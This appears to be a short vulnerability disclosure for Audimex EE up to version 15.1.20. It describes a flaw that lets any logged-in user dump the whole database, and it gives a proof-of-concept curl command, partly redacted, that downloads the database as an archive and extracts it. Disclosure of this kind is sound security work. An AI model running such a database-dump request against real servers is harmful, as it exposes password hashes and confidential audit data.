# Audimex EE

## Versions affected: <= 15.1.20

## Description:

Analyzing the offline client code, it was identified that it is possible for any user (with any privilege) of Audimex to dump the whole Audimex database. This gives visibility upon password hashes of any user, ongoing audit data and more.

## POC

Replace the cookie placeholder with the cookie of any valid user:

```bash
curl -s -k -X $'POST' -b $'wal_sid_axdx_1={COOKIE_OF_ANY_VALID_USER}' [REDACTED FOR THE MOMENT] -F "sid=axdx_1" $'https://{HOST}/app/cgi-bin/wal.fcgi' -o db.zip && 7z -y x db.zip
```
